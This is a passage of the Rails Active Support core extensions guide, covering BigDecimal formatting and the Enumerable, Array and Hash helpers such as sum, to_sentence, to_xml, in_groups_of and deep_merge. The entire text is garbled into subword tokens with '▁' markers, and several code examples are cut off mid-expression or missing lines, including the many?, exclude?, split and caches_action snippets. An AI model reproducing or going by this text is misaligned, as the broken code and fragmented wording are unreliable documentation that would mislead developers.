▁Extensions ▁to ▁` BigDecimal `
▁### ▁` to _ s `
▁The ▁method ▁` to _ s ` ▁is ▁alias ed ▁to ▁` to _ formatted _ s `.
▁This ▁provides ▁a ▁convenient ▁way ▁to ▁display ▁a ▁ BigDecimal ▁value ▁in ▁f lo at ing - point ▁notation :
▁ BigDecimal . new ( 5.0 0, ▁6 ). to _ s ▁# ▁=> ▁" 5.0 "
▁### ▁` to _ formatted _ s `
▁T e ▁method ▁` to _ formatted _ s ` ▁provides ▁a ▁default ▁specifie r ▁of ▁" F ".
▁This ▁means ▁that ▁a ▁simple ▁call ▁to ▁` to _ formatted _ s ` ▁or ▁` to _ s ` ▁will ▁result ▁in ▁f lo at ing ▁point ▁representation ▁instead ▁of ▁engine er ing ▁notation :
▁ BigDecimal . new ( 5.0 0, ▁6 ). to _ formatted _ s ▁# ▁=> ▁" 5.0 "
▁and ▁that ▁symbol ▁specifie r s ▁are ▁also ▁supported :
▁ BigDecimal . new ( 5.0 0, ▁6 ). to _ formatted _ s (: db ) ▁# ▁=> ▁" 5.0 "
▁ Engine er ing ▁notation ▁is ▁ still ▁supported :
▁ BigDecimal . new ( 5.0 0, ▁6 ). to _ formatted _ s (" e ") ▁# ▁=> ▁" 0 . 5 E 1 "
▁Extensions ▁to ▁` E numerable `
▁### ▁` sum `
▁The ▁method ▁` sum ` ▁add s ▁the ▁elements ▁of ▁an ▁e numerable :
▁[1, ▁2, ▁3 ] . sum ▁# ▁=> ▁6
▁( 1 . . 1 00 ). sum ▁# ▁=> ▁50 50
▁Add it ion ▁only ▁assume s ▁the ▁elements ▁respond ▁to ▁` + ` :
▁[[1, ▁2 ] , ▁[ 2 , ▁3 ] , ▁[ 3 , ▁4 ]] . sum ▁# ▁=> ▁[1, ▁2, ▁2, ▁3 , ▁3 , ▁4 ]
▁% w ( foo ▁bar ▁ baz ). sum ▁# ▁=> ▁" foobar baz "
▁ { a : ▁1, ▁b : ▁2, ▁c : ▁3 }. sum ▁# ▁=> ▁[ : b , ▁2, ▁: c , ▁3 , ▁: a , ▁1 ]
▁The ▁ sum ▁of ▁an ▁empty ▁collection ▁is ▁ zero ▁by ▁default , ▁but ▁this ▁is ▁customiz able :
▁[] . sum ▁# ▁=> ▁0
▁[] . sum (1) ▁# ▁=> ▁1
▁If ▁a ▁block ▁is ▁given , ▁` sum ` ▁becomes ▁an ▁iterat or ▁that ▁yields ▁the ▁elements ▁of ▁the ▁collection ▁and ▁ sum s ▁the ▁returned ▁values :
▁( 1 . . 5 ). sum ▁ { | n | ▁ n ▁* ▁2 ▁ } ▁# ▁=> ▁30
▁[ 2 , ▁4 , ▁6 , ▁ 8 , ▁10 ] . sum ▁# ▁=> ▁30
▁The ▁ sum ▁of ▁an ▁empty ▁receiver ▁can ▁be ▁customize d ▁in ▁this ▁form ▁as ▁well :
▁[] . sum (1) ▁ { | n | ▁ n ** 3 } ▁# ▁=> ▁1
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / e numerable . rb `.
▁### ▁` index _ by `
▁The ▁method ▁` index _ by ` ▁generates ▁a ▁hash ▁with ▁the ▁elements ▁of ▁an ▁e numerable ▁index ed ▁by ▁some ▁key .
▁It ▁iterate s ▁through ▁the ▁collection ▁and ▁passes ▁each ▁element ▁to ▁a ▁block .
▁The ▁element ▁will ▁be ▁key ed ▁by ▁the ▁value ▁returned ▁by ▁the ▁block :
▁ invoice s . index _ by ( & : number )
▁# ▁=> ▁ { ' 200 9 - 0 3 2 ' ▁=> ▁< Invoice ▁...
▁ > , ▁' 200 9 - 0 08 ' ▁=> ▁< Invoice ▁...
▁ > , ▁... }
▁WARNING . ▁ K e y s ▁should ▁normally ▁be ▁unique .
▁If ▁the ▁block ▁returns ▁the ▁same ▁value ▁for ▁different ▁elements ▁no ▁collection ▁is ▁built ▁for ▁that ▁key .
▁The ▁last ▁item ▁will ▁ w in .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / e numerable . rb `.
▁### ▁` many ?
▁The ▁method ▁` many ?` ▁is ▁shorthand ▁for ▁` collection . size ▁ > ▁1 ` :
▁<% ▁if ▁pages . many ?
▁<%= ▁pagination _ links ▁%>
▁If ▁an ▁optional ▁block ▁is ▁given , ▁` many ?` ▁only ▁take s ▁into ▁account ▁those ▁elements ▁that ▁return ▁true :
▁@ see _ more ▁= ▁video s . many ?
▁ { | video | ▁video . category ▁== ▁params [: category ]}
▁### ▁` exclude ?
▁The ▁predicate ▁` exclude ?` ▁tests ▁whether ▁a ▁given ▁object ▁does ▁** not ** ▁be long ▁to ▁the ▁collection .
▁It ▁is ▁the ▁ n eg ation ▁of ▁the ▁built - in ▁` include ?` :
▁to _ visit ▁< < ▁ n ode ▁if ▁visit ed . exclude ?(
▁Extensions ▁to ▁` Array `
▁### ▁Access ing
▁Active ▁Support ▁a ug ment s ▁the ▁API ▁of ▁arrays ▁to ▁e as e ▁certain ▁ways ▁of ▁access ing ▁them .
▁For ▁example , ▁` to ` ▁returns ▁the ▁sub array ▁of ▁elements ▁up ▁to ▁the ▁one ▁at ▁the ▁passed ▁index :
▁% w ( a ▁b ▁c ▁d ). to (2) ▁# ▁=> ▁% w ( a ▁b ▁c )
▁[] . to ( 7 ) ▁# ▁=> ▁[]
▁Similar ly , ▁` from ` ▁returns ▁the ▁t a il ▁from ▁the ▁element ▁at ▁the ▁passed ▁index ▁to ▁the ▁end .
▁If ▁the ▁index ▁is ▁greater ▁than ▁the ▁length ▁of ▁the ▁array , ▁it ▁returns ▁an ▁empty ▁array .
▁% w ( a ▁b ▁c ▁d ). from (2) ▁# ▁=> ▁% w ( c ▁d )
▁% w ( a ▁b ▁c ▁d ). from (10) ▁# ▁=> ▁[]
▁[] . from (0) ▁# ▁=> ▁[]
▁The ▁methods ▁` second `, ▁` th ir d `, ▁` f our th `, ▁and ▁` f if th ` ▁return ▁the ▁corresponding ▁element ▁( ` first ` ▁is ▁built - in ).
▁T hanks ▁to ▁so cial ▁ w is do m ▁and ▁p o s i tive ▁construct ive n es s ▁all ▁around , ▁` for t y _ two ` ▁is ▁also ▁available .
▁% w ( a ▁b ▁c ▁d ). th ir d ▁# ▁=> ▁c
▁% w ( a ▁b ▁c ▁d ). f if th ▁# ▁=> ▁nil
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / array / access . rb `.
▁### ▁ Adding ▁E le ment s
▁#### ▁` prepend `
▁This ▁method ▁is ▁an ▁alias ▁of ▁` Array # un s h if t `.
▁% w ( a ▁b ▁c ▁d ). prepend (' e ') ▁# ▁=> ▁% w ( e ▁a ▁b ▁c ▁d )
▁[] . prepend (10) ▁# ▁=> ▁[ 10 ]
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / array / prepend _ and _ app end . rb `.
▁#### ▁` app end `
▁This ▁method ▁is ▁an ▁alias ▁of ▁` Array # < < `.
▁% w ( a ▁b ▁c ▁d ). app end (' e ') ▁# ▁=> ▁% w ( a ▁b ▁c ▁d ▁e )
▁[] . app end ( [ 1, 2 ]) ▁# ▁=> ▁[[1, 2 ]]
▁### ▁ Options ▁ Ex tr action
▁When ▁the ▁last ▁argument ▁in ▁a ▁method ▁call ▁is ▁a ▁hash , ▁except ▁p erhaps ▁for ▁a ▁` & block ` ▁argument , ▁Ruby ▁allows ▁you ▁to ▁omit ▁the ▁bracket s :
▁email : ▁params [: email ])
▁That ▁ s y n t ac tic ▁ s ug ar ▁is ▁used ▁a ▁lot ▁in ▁Rails ▁to ▁avoid ▁position al ▁arguments ▁where ▁there ▁would ▁be ▁too ▁many , ▁offer ing ▁instead ▁interface s ▁that ▁ emulate ▁named ▁parameters .
▁In ▁particular ▁it ▁is ▁very ▁idiomatic ▁to ▁use ▁a ▁tr ailing ▁hash ▁for ▁options .
▁If ▁a ▁method ▁expect s ▁a ▁variable ▁number ▁of ▁arguments ▁and ▁uses ▁` * ` ▁in ▁its ▁declaration , ▁however , ▁such ▁an ▁options ▁hash ▁end s ▁up ▁being ▁an ▁item ▁of ▁the ▁array ▁of ▁arguments , ▁where ▁it ▁ lo s es ▁its ▁role .
▁In ▁those ▁cases , ▁you ▁may ▁give ▁an ▁options ▁hash ▁a ▁distinguish ed ▁treat ment ▁with ▁` extract _ options !
▁If ▁it ▁is ▁a ▁hash ▁it ▁p o p s ▁it ▁and ▁returns ▁it , ▁otherwise ▁it ▁returns ▁an ▁empty ▁hash .
▁Let ' s ▁see ▁for ▁example ▁the ▁definition ▁of ▁the ▁` cache s _ action ` ▁controller ▁macro :
▁def ▁cache s _ action ( * action s )
▁return ▁unless ▁cache _ config ur ed ?
▁options ▁= ▁actions . extract _ options !
▁This ▁method ▁receive s ▁an ▁arbitrar y ▁number ▁of ▁action ▁names , ▁and ▁an ▁optional ▁hash ▁of ▁options ▁as ▁last ▁argument .
▁With ▁the ▁call ▁to ▁` extract _ options !` ▁you ▁obtain ▁the ▁options ▁hash ▁and ▁remove ▁it ▁from ▁` action s ` ▁in ▁a ▁simple ▁and ▁explicit ▁way .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / array / extract _ options . rb `.
▁#### ▁` to _ sentence `
▁The ▁method ▁` to _ sentence ` ▁turn s ▁an ▁array ▁into ▁a ▁string ▁containing ▁a ▁ sentence ▁that ▁ enumerate s ▁its ▁items :
▁% w ( ). to _ sentence ▁# ▁=> ▁" "
▁% w ( Earth ). to _ sentence ▁# ▁=> ▁" Earth "
▁% w ( Earth ▁Wi n d ). to _ sentence ▁# ▁=> ▁" Earth ▁and ▁Wi n d "
▁% w ( Earth ▁Wi n d ▁F i re ). to _ sentence ▁# ▁=> ▁" Earth , ▁Wi n d , ▁and ▁F i re "
▁This ▁method ▁accept s ▁three ▁options :
▁* ▁`: two _ words _ connect or ` : ▁What ▁is ▁used ▁for ▁arrays ▁of ▁length ▁2 .
▁Default ▁is ▁" ▁and ▁" .
▁* ▁`: words _ connect or ` : ▁What ▁is ▁used ▁to ▁join ▁the ▁elements ▁of ▁arrays ▁with ▁3 ▁or ▁more ▁elements , ▁except ▁for ▁the ▁last ▁two .
▁Default ▁is ▁" , ▁" .
▁* ▁`: last _ word _ connect or ` : ▁What ▁is ▁used ▁to ▁join ▁the ▁last ▁items ▁of ▁an ▁array ▁with ▁3 ▁or ▁more ▁elements .
▁Default ▁is ▁" , ▁and ▁" .
▁The ▁defaults ▁for ▁these ▁options ▁can ▁be ▁local ize d , ▁their ▁keys ▁are :
▁| ▁Option ▁| ▁I 18 n ▁key ▁|
▁| ▁ ------ ---------------- ▁| ▁ --- ---------------- ---------------- ▁|
▁| ▁`: two _ words _ connect or ` ▁| ▁` support . array . two _ words _ connect or ` ▁|
▁| ▁`: words _ connect or ` ▁| ▁` support . array . words _ connect or ` ▁|
▁| ▁`: last _ word _ connect or ` ▁| ▁` support . array . last _ word _ connect or ` ▁|
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / array / conversions . rb `.
▁#### ▁` to _ formatted _ s `
▁The ▁method ▁` to _ formatted _ s ` ▁act s ▁like ▁` to _ s ` ▁by ▁default .
▁If ▁the ▁array ▁contains ▁items ▁that ▁respond ▁to ▁` id `, ▁however , ▁the ▁symbol < n >`: db ` ▁may ▁be ▁passed ▁as ▁argument .
▁That ' s ▁typical ly ▁used ▁with < n > collection s ▁of ▁Active ▁Record ▁objects .
▁Return ed ▁strings ▁are :
▁[] . to _ formatted _ s (: db ) ▁# ▁=> ▁" null "
▁[ user ] . to _ formatted _ s (: db ) ▁# ▁=> ▁" 8 4 5 6 "
▁ invoice . line s . to _ formatted _ s (: db ) ▁# ▁=> ▁" 23 , 5 6 7 , 5 5 6 , 12 "
▁In t eg ers ▁in ▁the ▁example ▁above ▁are ▁suppose d ▁to ▁come ▁from ▁the ▁respective ▁calls ▁to ▁` id `.
▁#### ▁` to _ xml `
▁The ▁method ▁` to _ xml ` ▁returns ▁a ▁string ▁containing ▁an ▁ X ML ▁representation ▁of ▁its ▁receiver :
▁ Contribut or . limit (2) . order (: rank ). to _ xml
▁xml ▁version =" 1 . 0 " ▁encoding =" UT F -8 " ?
▁# ▁< contributor s ▁type =" array ">
▁# ▁< contributor >
▁# ▁< id ▁type =" integer "> 4 3 5 6 </ id >
▁# ▁< name > J er e my ▁ K e mp er </ name >
▁# ▁< rank ▁type =" integer "> 1 </ rank >
▁# ▁< url - id > j er e my - k e mp er </ url - id >
▁# ▁</ contributor >
▁# ▁< id ▁type =" integer "> 44 04 </ id >
▁# ▁< name > David ▁H einemeier ▁Hansson </ name >
▁# ▁< rank ▁type =" integer "> 2 </ rank >
▁# ▁< url - id > d a v id - h einemeier - ha n s s on </ url - id >
▁# ▁</ contributor s >
▁To ▁do ▁so ▁it ▁send s ▁` to _ xml ` ▁to ▁every ▁item ▁in ▁turn , ▁and ▁collect s ▁the ▁results ▁under ▁a ▁root ▁ n ode .
▁All ▁items ▁must ▁respond ▁to ▁` to _ xml `, ▁an ▁exception ▁is ▁raised ▁otherwise .
▁By ▁default , ▁the ▁name ▁of ▁the ▁root ▁element ▁is ▁the ▁under sc or ize d ▁and ▁ dasherize d ▁plural ▁of ▁the ▁name ▁of ▁the ▁class ▁of ▁the ▁first ▁item , ▁provided ▁the ▁rest ▁of ▁elements ▁be long ▁to ▁that ▁type ▁( check ed ▁with ▁` is _ a ?` ) ▁and ▁they ▁are ▁not ▁hashes .
▁In ▁the ▁example ▁above ▁that ' s ▁" contributor s ".
▁If ▁there ' s ▁any ▁element ▁that ▁does ▁not ▁be long ▁to ▁the ▁type ▁of ▁the ▁first ▁one ▁the ▁root ▁ n ode ▁becomes ▁" objects " :
▁[ Contribut or . first , ▁Co m m it . first ] . to _ xml
▁# ▁< objects ▁type =" array ">
▁# ▁< object >
▁# ▁< id ▁type =" integer "> 4 58 3 </ id >
▁# ▁< name > A ar on ▁B at al ion </ name >
▁# ▁< rank ▁type =" integer "> 5 3 </ rank >
▁# ▁< url - id > a ar on - b at al ion </ url - id >
▁# ▁</ object >
▁# ▁< author > J o s h u a ▁P e e k </ author >
▁# ▁< author ed - timestamp ▁type =" datetime "> 200 9 - 0 9 - 02 T 16 : 44 : 36 Z </ author ed - timestamp >
▁# ▁< branch > origin / master </ branch >
▁# ▁< commit ter > J o s h u a ▁P e e k </ commit ter >
▁# ▁< git - show ▁nil =" true " ></ git - show >
▁# ▁< id ▁type =" integer "> 19 0 3 16 </ id >
▁# ▁< import ed - from - s v n ▁type =" boolean "> false </ import ed - from - s v n >
▁# ▁< message > K i ll ▁A M o ▁ ob s er v ing ▁wrap _ with _ notifications ▁since ▁A Re s ▁was ▁only ▁using ▁it </ message >
▁# ▁< s ha 1> 7 23 a 4 7 b f b 37 08 f 9 6 88 2 1 b c 9 6 9 a 9 a 3 f c 87 3 a 3 ed 58 </ s ha 1>
▁# ▁</ objects >
▁If ▁the ▁receiver ▁is ▁an ▁array ▁of ▁hashes ▁the ▁root ▁element ▁is ▁by ▁default ▁also ▁" objects " :
▁[ { a : ▁1, ▁b : ▁2 }, ▁ { c : ▁3 } ] . to _ xml
▁# ▁< b ▁type =" integer "> 2 </ b >
▁# ▁< a ▁type =" integer "> 1 </ a >
▁# ▁< c ▁type =" integer "> 3 </ c >
▁WARNING . ▁If ▁the ▁collection ▁is ▁empty ▁the ▁root ▁element ▁is ▁by ▁default ▁" nil - classes ".
▁That ' s ▁a ▁go t cha , ▁for ▁example ▁the ▁root ▁element ▁of ▁the ▁list ▁of ▁ contributor s ▁above ▁would ▁not ▁be ▁" contributor s " ▁if ▁the ▁collection ▁was ▁empty , ▁but ▁" nil - classes ".
▁You ▁may ▁use ▁the ▁`: root ` ▁option ▁to ▁ensure ▁a ▁consistent ▁root ▁element .
▁The ▁name ▁of ▁ child re n ▁ n ode s ▁is ▁by ▁default ▁the ▁name ▁of ▁the ▁root ▁ n ode ▁ singularize d .
▁In ▁the ▁examples ▁above ▁we ' ve ▁seen ▁" contributor " ▁and ▁" object ".
▁The ▁option ▁`: child re n ` ▁allows ▁you ▁to ▁set ▁these ▁ n ode ▁names .
▁The ▁default ▁ X ML ▁ builder ▁is ▁a ▁fresh ▁instance ▁of ▁` Builder :: X m l M ar k up `.
▁You ▁can ▁configure ▁your ▁own ▁ builder ▁via ▁the ▁`: builder ` ▁option .
▁The ▁method ▁also ▁accept s ▁options ▁like ▁`: dasherize ` ▁and ▁friend s , ▁they ▁are ▁forward ed ▁to ▁the ▁ builder :
▁ Contribut or . limit (2) . order (: rank ). to _ xml ( skip _ type s : ▁true )
▁# ▁< contributor s >
▁# ▁< id > 4 3 5 6 </ id >
▁# ▁< rank > 1 </ rank >
▁# ▁< id > 44 04 </ id >
▁# ▁< rank > 2 </ rank >
▁### ▁W r app ing
▁The ▁method ▁` Array . wrap ` ▁wrap s ▁its ▁argument ▁in ▁an ▁array ▁unless ▁it ▁is ▁already ▁an ▁array ▁( or ▁array - like ).
▁ Specific ally :
▁* ▁Otherwise , ▁if ▁the ▁argument ▁respond s ▁to ▁` to _ ary ` ▁it ▁is ▁invoked , ▁and ▁if ▁the ▁value ▁of ▁` to _ ary ` ▁is ▁not ▁` nil `, ▁it ▁is ▁returned .
▁* ▁Otherwise , ▁an ▁array ▁with ▁the ▁argument ▁as ▁its ▁single ▁element ▁is ▁returned .
▁ Array . wrap ( nil ) ▁# ▁=> ▁[]
▁ Array . wrap ( [ 1, ▁2, ▁3 ]) ▁# ▁=> ▁[1, ▁2, ▁3 ]
▁ Array . wrap (0) ▁# ▁=> ▁[ 0 ]
▁This ▁method ▁is ▁similar ▁in ▁purpose ▁to ▁` K er n el # Array `, ▁but ▁there ▁are ▁some ▁difference s :
▁* ▁If ▁the ▁argument ▁respond s ▁to ▁` to _ ary ` ▁the ▁method ▁is ▁invoked .
▁* ▁If ▁the ▁returned ▁value ▁from ▁` to _ ary ` ▁is ▁ n either ▁` nil ` ▁no r ▁an ▁` Array ` ▁object , ▁` K er n el # Array ` ▁raise s ▁an ▁exception , ▁while ▁` Array . wrap ` ▁does ▁not , ▁it ▁just ▁returns ▁the ▁value .
▁The ▁last ▁point ▁is ▁particular ly ▁worth ▁compar ing ▁for ▁some ▁e numerable s :
▁ Array . wrap ( foo : ▁: bar ) ▁# ▁=> ▁[ { : foo => : bar } ]
▁ Array ( foo : ▁: bar ) ▁# ▁=> ▁[ [: foo , ▁: bar ]]
▁There ' s ▁also ▁a ▁related ▁idiom ▁that ▁uses ▁the ▁ s plat ▁operator :
▁[ * object ]
▁which ▁in ▁Ruby ▁1. 8 ▁returns ▁` [ nil ]` ▁for ▁` nil `, ▁and ▁calls ▁to ▁` Array ( object )` ▁otherwise .
▁( P lease ▁if ▁you ▁know ▁the ▁exact ▁behavior ▁in ▁1.9 ▁ contact ▁f x n .)
▁Thus , ▁in ▁this ▁case ▁the ▁behavior ▁is ▁different ▁for ▁` nil `, ▁and ▁the ▁difference s ▁with ▁` K er n el # Array ` ▁explained ▁above ▁apply ▁to ▁the ▁rest ▁of ▁` object ` s .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / array / wrap . rb `.
▁### ▁D up li cat ing
▁The ▁method ▁` Array . deep _ dup ` ▁duplicate s ▁itself ▁and ▁all ▁objects ▁inside < n > recursive ly ▁with ▁Active ▁Support ▁method ▁` Object # deep _ dup `.
▁It ▁works ▁like ▁` Array # map ` ▁with ▁sending ▁` deep _ dup ` ▁method ▁to ▁each ▁object ▁inside .
▁array ▁= ▁[1, ▁[ 2 , ▁3 ]]
▁ dup ▁= ▁array . deep _ dup
▁ dup [ 1 ] [ 2 ] ▁= ▁4
▁array [ 1 ] [ 2 ] ▁== ▁nil ▁# ▁=> ▁true
▁### ▁G r o up ing
▁#### ▁` in _ groups _ of ( number , ▁fill _ with ▁= ▁nil )`
▁The ▁method ▁` in _ groups _ of ` ▁ split s ▁an ▁array ▁into ▁con sec u tive ▁group s ▁of ▁a ▁certain ▁size .
▁It ▁returns ▁an ▁array ▁with ▁the ▁group s :
▁[1, ▁2, ▁3 ] . in _ groups _ of (2) ▁# ▁=> ▁[[1, ▁2 ] , ▁[ 3 , ▁nil ]]
▁or ▁yields ▁them ▁in ▁turn ▁if ▁a ▁block ▁is ▁passed :
▁<% ▁sample . in _ groups _ of (3) ▁do ▁| a , ▁b , ▁c | ▁%>
▁< td > <%= ▁a ▁%></ td >
▁< td > <%= ▁b ▁%></ td >
▁< td > <%= ▁c ▁%></ td >
▁The ▁first ▁example ▁shows ▁` in _ groups _ of ` ▁fill s ▁the ▁last ▁group ▁with ▁as ▁many ▁` nil ` ▁elements ▁as ▁needed ▁to ▁have ▁the ▁request ed ▁size .
▁You ▁can ▁change ▁this ▁p adding ▁value ▁using ▁the ▁second ▁optional ▁argument :
▁[1, ▁2, ▁3 ] . in _ groups _ of ( 2 , ▁0 ) ▁# ▁=> ▁[[1, ▁2 ] , ▁[ 3 , ▁0 ]]
▁And ▁you ▁can ▁tell ▁the ▁method ▁not ▁to ▁fill ▁the ▁last ▁group ▁passing ▁` false ` :
▁[1, ▁2, ▁3 ] . in _ groups _ of ( 2 , ▁false ) ▁# ▁=> ▁[[1, ▁2 ] , ▁[ 3 ]]
▁As ▁a ▁con sequence ▁` false ` ▁can ' t ▁be ▁a ▁used ▁as ▁a ▁p adding ▁value .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / array / group ing . rb `.
▁#### ▁` in _ groups ( number , ▁fill _ with ▁= ▁nil )`
▁The ▁method ▁` in _ groups ` ▁ split s ▁an ▁array ▁into ▁a ▁certain ▁number ▁of ▁group s .
▁The ▁method ▁returns ▁an ▁array ▁with ▁the ▁group s :
▁% w ( 1 ▁2 ▁3 ▁4 ▁5 ▁6 ▁7 ). in _ groups (3)
▁# ▁=> ▁[ [ "1" , ▁" 2 ", ▁" 3 "] , ▁[" 4 ", ▁" 5 ", ▁nil ] , ▁[" 6 ", ▁" 7 ", ▁nil ]]
▁% w ( 1 ▁2 ▁3 ▁4 ▁5 ▁6 ▁7 ). in _ groups (3) ▁ { | group | ▁p ▁group }
▁[ "1" , ▁" 2 ", ▁" 3 "]
▁[" 4 ", ▁" 5 ", ▁nil ]
▁[" 6 ", ▁" 7 ", ▁nil ]
▁The ▁examples ▁above ▁show ▁that ▁` in _ groups ` ▁fill s ▁some ▁group s ▁with ▁a ▁tr ailing ▁` nil ` ▁element ▁as ▁needed .
▁And ▁the ▁group s ▁that ▁have ▁them ▁are ▁always ▁the ▁last ▁one s .
▁% w ( 1 ▁2 ▁3 ▁4 ▁5 ▁6 ▁7 ). in _ groups ( 3 , ▁" 0 ")
▁# ▁=> ▁[ [ "1" , ▁" 2 ", ▁" 3 "] , ▁[" 4 ", ▁" 5 ", ▁" 0 "] , ▁[" 6 ", ▁" 7 ", ▁" 0 " ]]
▁And ▁you ▁can ▁tell ▁the ▁method ▁not ▁to ▁fill ▁the ▁small er ▁group s ▁passing ▁` false ` :
▁% w ( 1 ▁2 ▁3 ▁4 ▁5 ▁6 ▁7 ). in _ groups ( 3 , ▁false )
▁# ▁=> ▁[ [ "1" , ▁" 2 ", ▁" 3 "] , ▁[" 4 ", ▁" 5 "] , ▁[" 6 ", ▁" 7 " ]]
▁#### ▁` split ( value ▁= ▁nil )`
▁The ▁method ▁` split ` ▁ div id es ▁an ▁array ▁by ▁a ▁ separator ▁and ▁returns ▁the ▁result ing ▁chunks .
▁If ▁a ▁block ▁is ▁passed ▁the ▁ separator s ▁are ▁those ▁elements ▁of ▁the ▁array ▁for ▁which ▁the ▁block ▁returns ▁true :
▁( - 5 . . 5 ). to _ a . split ▁ { ▁| i | ▁i . multiple _ of ?(
▁# ▁=> ▁[ [ - 5 ] , ▁[ - 3 , ▁- 2 , ▁- 1 ] , ▁[1, ▁2, ▁3 ] , ▁[ 5 ]]
▁Otherwise , ▁the ▁value ▁receive d ▁as ▁argument , ▁which ▁defaults ▁to ▁` nil `, ▁is ▁the ▁ separator :
▁[ 0, ▁1, ▁- 5 , ▁1, ▁1, ▁" foo ", ▁" bar "] . split (1)
▁# ▁=> ▁[ [ 0 ] , ▁[ - 5 ] , ▁[] , ▁[" foo ", ▁" bar " ]]
▁TIP : ▁O b serve ▁in ▁the ▁previous ▁example ▁that ▁con sec u tive ▁ separator s ▁result ▁in ▁empty ▁arrays .
▁Extensions ▁to ▁` Hash `
▁{" foo " ▁=> ▁1, ▁" bar " ▁=> ▁2 }. to _ xml
▁# ▁< hash >
▁# ▁< foo ▁type =" integer "> 1 </ foo >
▁# ▁< bar ▁type =" integer "> 2 </ bar >
▁# ▁</ hash >
▁To ▁do ▁so , ▁the ▁method ▁loop s ▁over ▁the ▁pair s ▁and ▁build s ▁ n ode s ▁that ▁depend ▁on ▁the ▁ _ value s _ .
▁G ive n ▁a ▁pair ▁` key `, ▁` value ` :
▁* ▁If ▁` value ` ▁is ▁a ▁hash ▁there ' s ▁a ▁ recursive ▁call ▁with ▁` key ` ▁as ▁`: root `.
▁* ▁If ▁` value ` ▁is ▁an ▁array ▁there ' s ▁a ▁ recursive ▁call ▁with ▁` key ` ▁as ▁`: root `, ▁and ▁` key ` ▁ singularize d ▁as ▁`: child re n `.
▁* ▁If ▁` value ` ▁is ▁a ▁call able ▁object ▁it ▁must ▁expect ▁one ▁or ▁two ▁arguments .
▁De pending ▁on ▁the ▁a r ity , ▁the ▁call able ▁is ▁invoked ▁with ▁the ▁` options ` ▁hash ▁as ▁first ▁argument ▁with ▁` key ` ▁as ▁`: root `, ▁and ▁` key ` ▁ singularize d ▁as ▁second ▁argument .
▁It s ▁return ▁value ▁becomes ▁a ▁new ▁ n ode .
▁* ▁If ▁` value ` ▁respond s ▁to ▁` to _ xml ` ▁the ▁method ▁is ▁invoked ▁with ▁` key ` ▁as ▁`: root `.
▁* ▁Otherwise , ▁a ▁ n ode ▁with ▁` key ` ▁as ▁tag ▁is ▁created ▁with ▁a ▁string ▁representation ▁of ▁` value ` ▁as ▁text ▁ n ode .
▁If ▁` value ` ▁is ▁` nil ` ▁an ▁attribute ▁" nil " ▁set ▁to ▁" true " ▁is ▁added .
▁Un less ▁the ▁option ▁`: skip _ type s ` ▁exists ▁and ▁is ▁true , ▁an ▁attribute ▁" type " ▁is ▁added ▁as ▁well ▁according ▁to ▁the ▁following ▁mapping :
▁ X ML _ TYPE _ N A ME S ▁= ▁ {
▁" Symbol " ▁=> ▁" symbol ",
▁" BigDecimal " ▁=> ▁" de ci m al ",
▁" F lo at " ▁=> ▁" f lo at ",
▁" T r ue Class " ▁=> ▁" boolean ",
▁" F al se Class " ▁=> ▁" boolean ",
▁" Date " ▁=> ▁" date ",
▁" DateTime " ▁=> ▁" datetime ",
▁" Time " ▁=> ▁" datetime "
▁By ▁default ▁the ▁root ▁ n ode ▁is ▁" hash ", ▁but ▁that ' s ▁config ur able ▁via ▁the ▁`: root ` ▁option .
▁You ▁can ▁configure ▁your ▁own ▁ builder ▁with ▁the ▁`: builder ` ▁option .
▁The ▁method ▁also ▁accept s ▁options ▁like ▁`: dasherize ` ▁and ▁friend s , ▁they ▁are ▁forward ed ▁to ▁the ▁ builder .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / hash / conversions . rb `.
▁### ▁M er g ing
▁Ruby ▁has ▁a ▁built - in ▁method ▁` Hash # merge ` ▁that ▁merge s ▁two ▁hashes :
▁ { a : ▁1, ▁b : ▁1 }. merge ( a : ▁0 , ▁c : ▁2 )
▁# ▁=> ▁ { : a => 0, ▁: b =>1 , ▁: c =>2}
▁Active ▁Support ▁defines ▁a ▁few ▁more ▁ways ▁of ▁m er g ing ▁hashes ▁that ▁may ▁be ▁convenient .
▁#### ▁` reverse _ merge ` ▁and ▁` reverse _ merge !
▁In ▁case ▁of ▁co ll is ion ▁the ▁key ▁in ▁the ▁hash ▁of ▁the ▁argument ▁ w in s ▁in ▁` merge `.
▁You ▁can ▁support ▁option ▁hashes ▁with ▁default ▁values ▁in ▁a ▁compact ▁way ▁with ▁this ▁idiom :
▁options ▁= ▁ { length : ▁30 , ▁omission : ▁" ..." }. merge ( options )
▁Active ▁Support ▁defines ▁` reverse _ merge ` ▁in ▁case ▁you ▁prefer ▁this ▁ alternative ▁notation :
▁options ▁= ▁options . reverse _ merge ( length : ▁30 , ▁omission : ▁" ..." )
▁And ▁a ▁ bang ▁version ▁` reverse _ merge !` ▁that ▁perform s ▁the ▁merge ▁in ▁place :
▁length : ▁30 , ▁omission : ▁" ..." )
▁WARNING . ▁Take ▁into ▁account ▁that ▁` reverse _ merge !` ▁may ▁change ▁the ▁hash ▁in ▁the ▁call er , ▁which ▁may ▁or ▁may ▁not ▁be ▁a ▁good ▁idea .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / hash / reverse _ merge . rb `.
▁#### ▁` reverse _ update `
▁The ▁method ▁` reverse _ update ` ▁is ▁an ▁alias ▁for ▁` reverse _ merge !` , ▁explained ▁above .
▁WARNING . ▁Note ▁that ▁` reverse _ update ` ▁has ▁no ▁ bang .
▁#### ▁` deep _ merge ` ▁and ▁` deep _ merge !
▁As ▁you ▁can ▁see ▁in ▁the ▁previous ▁example ▁if ▁a ▁key ▁is ▁found ▁in ▁both ▁hashes ▁the ▁value ▁in ▁the ▁one ▁in ▁the ▁argument ▁ w in s .
▁Active ▁Support ▁defines ▁` Hash # deep _ merge `.
▁In ▁a ▁ deep ▁merge , ▁if ▁a ▁key ▁is ▁found ▁in ▁both ▁hashes ▁and ▁their ▁values ▁are ▁hashes ▁in ▁turn , ▁the n ▁their ▁ _ merge _ ▁becomes ▁the ▁value ▁in ▁the ▁result ing ▁hash :
▁ { a : ▁ { b : ▁1 } }. deep _ merge ( a : ▁ { c : ▁2 })
